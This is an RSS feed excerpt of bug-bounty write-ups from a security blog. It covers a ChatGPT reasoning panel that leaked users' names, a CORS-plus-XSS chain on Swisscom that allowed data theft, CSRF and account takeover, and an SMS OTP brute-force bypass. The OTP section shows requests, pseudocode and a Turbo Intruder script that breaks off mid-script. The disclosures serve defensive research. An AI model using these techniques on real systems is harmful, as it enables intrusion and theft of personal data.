+&lt;li>&lt;strong>28 May 2025&lt;/strong> - Anthropic added a warning to the documentation: &lt;a class="link" href="https://github.com/anthropics/anthropic-sdk-python?tab=readme-ov-file#undocumented-request-params" target="_blank" rel="noopener"
+>https://github.com/anthropics/anthropic-sdk-python?tab=readme-ov-file#undocumented-request-params&lt;/a>&lt;/li>
+&lt;li>&lt;strong>03 Jun 2025&lt;/strong> - Full public disclosure so developers can patch their code.&lt;/li>
+&lt;/ul></description></item><item><title>Thoughts That Talk Back - How ChatGPT Quietly Doxxed Your Name</title><link>https://blog.ys0.dev/p/thoughts-that-talk-back-chatgpt/</link><pubDate>Wed, 14 May 2025 00:00:00 +0000</pubDate><guid>https://blog.ys0.dev/p/thoughts-that-talk-back-chatgpt/</guid><description>&lt;img src="https://blog.ys0.dev/p/thoughts-that-talk-back-chatgpt/cover-chat-leak.png" alt="Featured image of post Thoughts That Talk Back - How ChatGPT Quietly Doxxed Your Name" />&lt;p>Sharing your chats has never been easier - you simply click &lt;strong>Share&lt;/strong>, the conversation is anonymised, and you’re clear to show what ChatGPT produced for you. There are no privacy implications - unless you pasted personal data into the chat itself, which OpenAI discourages.&lt;br>
+However, on &lt;strong>16th April 2025&lt;/strong> OpenAI rolled out two new reasoning models, &lt;strong>o3&lt;/strong> and &lt;strong>o4-mini&lt;/strong>, that &lt;em>unexpectedly leaked the profile name&lt;/em> associated with your OpenAI account.&lt;/p>
+&lt;p>The leak was model-side, not user-side: the model echoed the name inside its hidden &lt;strong>“thoughts”&lt;/strong> panel, so the disclosure went unnoticed unless someone expanded that view.&lt;/p>
+&lt;h2 id="example">Example
+&lt;/h2>&lt;p>Someone posted a share link on X/Twitter (account and URL redacted for privacy):&lt;/p>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/thoughts-that-talk-back-chatgpt/screenshot_a.png"
+width="1218"
+height="479"
+loading="lazy"
+alt="Twitter post with a shared chat"
+class="gallery-image"
+data-flex-grow="254"
+data-flex-basis="610px"
+>&lt;/p>
+&lt;p>Opening the link shows the banner &lt;em>“This is a copy of a conversation between ChatGPT &amp;amp; Anonymous.”&lt;/em>&lt;br>
+But after opening &lt;strong>Thought for 6 seconds&lt;/strong>, you can see the user’s first name - &lt;em>Artem&lt;/em>:&lt;/p>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/thoughts-that-talk-back-chatgpt/screenshot_b.png"
+width="1686"
+height="1530"
+loading="lazy"
+alt="Not that Anonymous chat"
+class="gallery-image"
+data-flex-grow="110"
+data-flex-basis="264px"
+>&lt;/p>
+&lt;h3 id="why-the-name-leaked">Why the name leaked
+&lt;/h3>&lt;ul>
+&lt;li>At inference time the model appears to have had access to an internal variable (likely via an API call) that contained the user’s display name.&lt;/li>
+&lt;li>That variable was reflected into the chain-of-thought.&lt;/li>
+&lt;li>Had other profile fields been available through the same path, the impact could have been worse, so the possibility is worth exploring.&lt;/li>
+&lt;/ul>
+&lt;h3 id="practical-risk">Practical risk
+&lt;/h3>&lt;p>There is &lt;strong>no risk&lt;/strong> &lt;em>unless&lt;/em> you want to remain as anonymous as advertised:&lt;/p>
+&lt;ul>
+&lt;li>If you shared a chat with &lt;strong>o3&lt;/strong> or &lt;strong>o4-mini&lt;/strong> between &lt;strong>16 - 18 April 2025&lt;/strong> and care about anonymity, delete the link.&lt;/li>
+&lt;li>The behaviour is no longer reproducible; engineers fixed it after discovering their own mistake.&lt;/li>
+&lt;/ul>
+&lt;h3 id="final-thoughts">Final Thoughts
+&lt;/h3>&lt;p>When it comes to reporting AI related bugs especially one really needs to clearly define the impact (even that might not be helpful) because as &lt;a class="link" href="https://josephthacker.com/hacking/2025/02/25/how-to-hack-ai-apps.html" target="_blank" rel="noopener"
+>Joseph Thacker said&lt;/a>:&lt;/p>
+&lt;p>&lt;em>“Many AI vulnerabilities are dismissed because their real-world impact is unclear. Clearly explain how an exploit could lead to unauthorized actions, data leaks, or security-policy violations.”&lt;/em>&lt;/p>
+&lt;h3 id="timeline">Timeline
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>16 Apr 2025 20:11 UTC&lt;/strong> – reported.&lt;/li>
+&lt;li>&lt;strong>18 Apr 2025 13:54 UTC&lt;/strong> – closed as &lt;em>Not Applicable&lt;/em> by Bugcrowd (not OpenAI), citing user responsibility for redacting private data.&lt;/li>
+&lt;li>&lt;strong>18 Apr 2025&lt;/strong> – Patch only for new chats deployed (unknown source and time)&lt;/li>
+&lt;li>&lt;strong>21 Apr 2025&lt;/strong> - closed again as N/A&lt;/li>
+&lt;li>&lt;strong>21 Apr 2025&lt;/strong> - Asked for OpenAI team response&lt;/li>
+&lt;li>&lt;strong>30 Apr 2025&lt;/strong> - Asked for OpenAI team response&lt;/li>
+&lt;li>&lt;strong>15 May 2025&lt;/strong> - Disclosed&lt;/li>
+&lt;/ul>
+&lt;h3 id="ps">P.S.
+&lt;/h3>&lt;p>This is a response I got from Bugcrowd, where they refer to OpenAI&amp;rsquo;s statement that the user should not share sensitive data in the chats they want to share publicly. Sounds right unless the sensitive content is shared by the model outside of user&amp;rsquo;s control:&lt;/p>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/thoughts-that-talk-back-chatgpt/bugcrowd_response.png"
+width="2191"
+height="860"
+loading="lazy"
+alt="Interesting assessment from Bugcrowd"
+class="gallery-image"
+data-flex-grow="254"
+data-flex-basis="611px"
+>&lt;/p></description></item><item><title>Overlooked CORS Misconfiguration led to CSRF on Core Asset of Swisscom</title><link>https://blog.ys0.dev/p/cors-csrf-swisscom-attack/</link><pubDate>Mon, 24 Feb 2025 00:00:00 +0000</pubDate><guid>https://blog.ys0.dev/p/cors-csrf-swisscom-attack/</guid><description>&lt;img src="https://blog.ys0.dev/p/cors-csrf-swisscom-attack/cover-cors.jpeg" alt="Featured image of post Overlooked CORS Misconfiguration led to CSRF on Core Asset of Swisscom" />&lt;p>I believe this vulnerability was overlooked by many hunters for quite some time even though it was in the core scope of a well-known bug bounty program that receives hundreds of reports per month.&lt;/p>
+&lt;p>The issue itself is fairly simple in essence. We have a domain that reflects the value of the request&amp;rsquo;s &lt;code>Origin&lt;/code> header into the &lt;code>Access-Control-Allow-Origin&lt;/code> response header. In addition to that, the endpoint returns the following headers:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="err">Access-Control-Allow-Origin: https://evil.com
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Access-Control-Allow-Headers: Accept, Authorization, Cache-Control, Content-Type, Origin, Pragma, X-Api-Authorization, X-Cache-For, X-CSRF-Token, X-HTTP-Method-Override, X-Requested-With, Adrum, X-Add-Attributes, X-Add-Headers, X-Force-Accept-Language, X-Referer
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Access-Control-Expose-Headers: Content-Length, Content-Location, Content-Range, Content-Type, Link, Last-Modified, Location, X-CSRF-Token, X-Enabled, X-Linguist-Hash
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Access-Control-Allow-Credentials: true
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">Access-Control-Allow-Methods: GET, POST, OPTIONS, HEAD, PATCH, DELETE
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>In general, if &lt;code>Access-Control-Allow-Origin&lt;/code> is set to a specific domain and &lt;code>Access-Control-Allow-Credentials&lt;/code> is set to &lt;code>true&lt;/code>, then the website trusts this domain to carry out requests on behalf of the user (the browser includes user&amp;rsquo;s cookies). For detailed information about CORS, refer to &lt;a class="link" href="https://web.dev/articles/cross-origin-resource-sharing" target="_blank" rel="noopener"
+>web.dev&lt;/a> or &lt;a class="link" href="https://portswigger.net/web-security/cors" target="_blank" rel="noopener"
+>Portswigger&lt;/a>&lt;/p>
+&lt;h2 id="unexploitable-cors">&lt;strong>Unexploitable CORS&lt;/strong>
+&lt;/h2>&lt;p>At first, I created a quick Proof of Concept and tested it, but unfortunately, the browser didn’t send any cookies. Why?&lt;/p>
+&lt;p>The answer lies in how the authentication cookies were set. I examined the endpoint responsible for setting the cookie and it had the following attributes:&lt;/p>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/cors-csrf-swisscom-attack/cookies.png"
+width="1166"
+height="190"
+loading="lazy"
+alt="Example of how the authentication cookie was set"
+class="gallery-image"
+data-flex-grow="613"
+data-flex-basis="1472px"
+>&lt;/p>
+&lt;p>The &lt;code>SameSite=Lax&lt;/code> attribute basically means that the authentication cookie is only sent when the request originates from a same-site context, with a few exceptions:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Lax+POST (2-minute window when the cookie is first set)&lt;/strong> – Not applicable here, as we are trying to exploit CORS, and the target uses CSRF tokens to protect against CSRF attacks. Additionally, the &lt;code>SameSite&lt;/code> flag is explicitly set, preventing &lt;code>Lax+POST&lt;/code> from working.&lt;/li>
+&lt;li>&lt;strong>Top-level navigation&lt;/strong> – Again, this does not help since we are trying to exploit CORS.&lt;/li>
+&lt;/ul>
+&lt;p>This is likely the point where many researchers gave up. However, there was still a way to exploit the issue - just not from an arbitrary domain. Instead, we needed access to a subdomain under the same site (&lt;code>.swisscom.ch&lt;/code>).&lt;/p>
+&lt;p>Finding an XSS vulnerability would typically require giving up a bounty or spending an unknown amount of time searching for one. Instead, I focused on something every security professional loves - &lt;strong>out-of-scope assets&lt;/strong>.&lt;/p>
+&lt;h2 id="chaining-the-exploit-with-xss">&lt;strong>Chaining the Exploit with XSS&lt;/strong>
+&lt;/h2>&lt;p>Fortunately, Swisscom has customer subdomains under &lt;code>.cust.swisscom.com&lt;/code>. With the help of Google Dork magic I identified an XSS within two minutes on the following site:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">site:cust.swisscom.ch inurl:search
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>With this, exploitation became straightforward:&lt;/p>
+&lt;ol>
+&lt;li>Get a user to visit our controlled subdomain.&lt;/li>
+&lt;li>Send a &lt;code>POST&lt;/code> request to the vulnerable XSS endpoint.&lt;/li>
+&lt;li>Inject JavaScript via XSS to send CORS requests and extract user data.&lt;/li>
+&lt;li>Profit.&lt;/li>
+&lt;/ol>
+&lt;p>Now, we could query all available user data from the target system.&lt;/p>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/cors-csrf-swisscom-attack/location.png"
+width="707"
+height="547"
+loading="lazy"
+alt="Query user’s token info"
+class="gallery-image"
+data-flex-grow="129"
+data-flex-basis="310px"
+>&lt;/p>
+&lt;h2 id="csrf-exposure">&lt;strong>CSRF Exposure&lt;/strong>
+&lt;/h2>&lt;p>Another crucial observation: the &lt;code>Access-Control-Expose-Headers&lt;/code> list included &lt;code>X-CSRF-Token&lt;/code>, which meant we could retrieve the user’s CSRF token. This allowed not only data exfiltration but also &lt;strong>modifying data&lt;/strong> via &lt;code>POST&lt;/code>, &lt;code>PATCH&lt;/code>, and &lt;code>DELETE&lt;/code> requests. In the end if the adversary happenned to attack a user with an Admin or SuperUser role they could leverage the CSRF to perform Account Takeovers via &lt;code>api/sc/set-email&lt;/code>.&lt;/p>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/cors-csrf-swisscom-attack/leak-info.png"
+width="1919"
+height="1510"
+loading="lazy"
+alt="Leak CSRF token"
+class="gallery-image"
+data-flex-grow="127"
+data-flex-basis="305px"
+>&lt;/p>
+&lt;h2 id="a-wormable-exploit">&lt;strong>A Wormable Exploit&lt;/strong>
+&lt;/h2>&lt;p>An interesting aspect of this platform is its &lt;strong>wormable properties&lt;/strong> when it comes to client-side issues like XSS. Users on the platform could chat with each other, and through CORS and CSRF exploitation, the payload could propagate itself across accounts.&lt;/p>
+&lt;p>&lt;img src="https://blog.ys0.dev/p/cors-csrf-swisscom-attack/leak-message.png"
+width="1744"
+height="1426"
+loading="lazy"
+alt="Query or send messages"
+class="gallery-image"
+data-flex-grow="122"
+data-flex-basis="293px"
+>&lt;/p>
+&lt;h2 id="final-thoughts">&lt;strong>Final Thoughts&lt;/strong>
+&lt;/h2>&lt;p>Thinking beyond constraints and getting back to fundamentals is rather an important skill to hone. These approaches can lead to identifying something fairly simple lying on the surface which everyone else has overlooked.&lt;/p>
+&lt;h2 id="timeline">&lt;strong>Timeline&lt;/strong>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>27.01.2025&lt;/strong> - Issue reported&lt;/li>
+&lt;li>&lt;strong>29.01.2025&lt;/strong> - Issue triaged&lt;/li>
+&lt;li>&lt;strong>07.02.2025&lt;/strong> - Issue fixed&lt;/li>
+&lt;li>&lt;strong>07.02.2025&lt;/strong> - Fix verified&lt;/li>
+&lt;li>&lt;strong>??.??.????&lt;/strong> - Awaiting bounty decision&lt;/li>
+&lt;/ul></description></item><item><title>Bypassing SMS OTP Authentication or a story behind $16.5k in bounties</title><link>https://blog.ys0.dev/p/playing-with-sms-otps/</link><pubDate>Tue, 04 Feb 2025 00:00:00 +0000</pubDate><guid>https://blog.ys0.dev/p/playing-with-sms-otps/</guid><description>&lt;img src="https://blog.ys0.dev/p/playing-with-sms-otps/cover.jpeg" alt="Featured image of post Bypassing SMS OTP Authentication or a story behind $16.5k in bounties" />&lt;p>It&amp;rsquo;s common to see SMS OTPs used for authentication, but bypassing them is not always trivial. In this post, we&amp;rsquo;ll explore such an exploitation scenario by reverse engineering a black-box functionality, applying probability theory and analyzing entropy.&lt;/p>
+&lt;p>This is my first blog post ever, so I&amp;rsquo;d appreciate any feedback via any channel you find appropriate.&lt;/p>
+&lt;h2 id="prologue">Prologue
+&lt;/h2>&lt;p>I discovered a simple PII disclosure vulnerability on an endpoint that returned customer data based on a provided phone number. The customer data included name, surname, email, phone number, full location, birth date, nationality, ID card or passport number.&lt;/p>
+&lt;p>Example request:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/retrieve-customer-data&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">redacted.example.com&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">phonenumber=9999999
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blog.ys0.dev/p/playing-with-sms-otps/result.png"
+width="1558"
+height="973"
+loading="lazy"
+alt="Example of the leaked data"
+class="gallery-image"
+data-flex-grow="160"
+data-flex-basis="384px"
+>&lt;/p>
+&lt;p>The functionality was only there to autofill user forms. The team initially patched an issue straightforwardly by returning only a boolean value whether or not the phone number exists in the database, which I verified.&lt;/p>
+&lt;p>However, three days later, developers reintroduced this feature with an additional security layer: requiring a user to provide an SMS OTP in order to retrieve data related to the phone number.&lt;/p>
+&lt;p>Sounds to be secure, but &amp;hellip;&lt;/p>
+&lt;h2 id="exploiting-weak-sms-otp-implementations">Exploiting Weak SMS OTP Implementations
+&lt;/h2>&lt;p>Now, retrieving data required the following two requests: first requesting an OTP, then entering a 4-digit random OTP to retrieve the same data as before.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/request-otp&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">redacted.example.com&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">phonenumber=9999999
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">POST&lt;/span> &lt;span class="nn">/retrieve-customer-data&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">redacted.example.com&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">phonenumber=9999999&amp;amp;otp=1111
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The first things I thought about and tested were:&lt;/p>
+&lt;ul>
+&lt;li>Not sending an OTP&lt;/li>
+&lt;li>Sending a &lt;code>null&lt;/code> OTP&lt;/li>
+&lt;li>Sending &lt;code>0000&lt;/code> OTP&lt;/li>
+&lt;li>Sending an OTP in different data types like arrays&lt;/li>
+&lt;li>Including both a body and query parameter for OTP&lt;/li>
+&lt;li>Changing request method&lt;/li>
+&lt;li>Changing content types and trying again with different data types&lt;/li>
+&lt;li>Attempting to retrieve data without requesting an OTP&lt;/li>
+&lt;/ul>
+&lt;p>Eventually, I tested how many attempts we have before the OTP is invalidated by simply trying first sending one wrong request and then a right OTP, then two, then three wrong requests, and then I understood that the OTP is invalided on the 4th request to &lt;code>/retrieve-customer-data&lt;/code>.&lt;/p>
+&lt;p>At this stage, guessing OTPs with a probability of 0.3% is already great, but can we do better?&lt;/p>
+&lt;p>Sure, while looking for a way to reset a counter of failed attempts, I have found that one can do this by requesting a new SMS message, which generates a new OTP, thus giving us three more attempts. In fact, we can only send 50 SMS messages for a phone number. Now, the setup is much better.&lt;/p>
+&lt;p>If you take a look at a pseudo code I reverse-engineered for this feature, you probably might notice a problem.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="n">fail_count_map&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1">## 9999999 -&amp;gt; int&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phone_to_otp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1">## 9999999 -&amp;gt; list(int)/set(int)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">phone_to_max_sms&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1">## 9999999 -&amp;gt; int&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">send_sms&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">phone_to_max_sms&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">50&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">429&lt;/span>&lt;span class="n">_TO_MANY_SMS_MESSAGES_SENT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">OTP&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">generate_and_send_SMS_OTP&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">phone_to_otp&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">OTP&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fail_count_map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">phone_to_max_sms&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">phone_to_max_sms&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_data&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">otp&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">otp&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">phone_to_otp&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">GET_USER_DATA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fail_count_map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">fail_count_map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">fail_count_map&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">phone_number&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># CLEAR OTPS&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>If you indeed noticed - congrats; if not, take a look at lines 2 and 15 - indeed SMS messages are not invalidated once we send a new one, they are simply kept in a structure similar to a set or list, thus each time we exceed our three &lt;code>/retrieve-customer-data&lt;/code> requests and send a new &lt;code>/request-otp&lt;/code> request we double our chances for the next three guesses.&lt;/p>
+&lt;p>For example:&lt;/p>
+&lt;ul>
+&lt;li>First 3 guesses with probabilities of 1/10000, 1/9999, 1/9998&lt;/li>
+&lt;li>Next 3 guesses with probabilities of 2/9997, 2/9996, 2/9995&lt;/li>
+&lt;li>Next 3 guesses with probabilities of 3/9994, 3/9993, 3/9992&lt;/li>
+&lt;/ul>
+&lt;p>After 50 OTP requests, the success rate reached ~&lt;strong>32%&lt;/strong>.&lt;/p>
+&lt;p>Finally, a cherry on top - while testing, I accumulated a few thousand SMS messages, did a simple distribution fitting and found that the most frequent group was 7000-7150. For the PoC, I chose to guess this range and wrote the following Turbo Intruder script.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">send_sms = &amp;#34;&amp;#34;&amp;#34;here goes your HTTP request&amp;#34;&amp;#34;&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">def queueRequests(target, wordlists):
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> engine = RequestEngine(endpoint=target.endpoint,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> concurrentConnections=5,
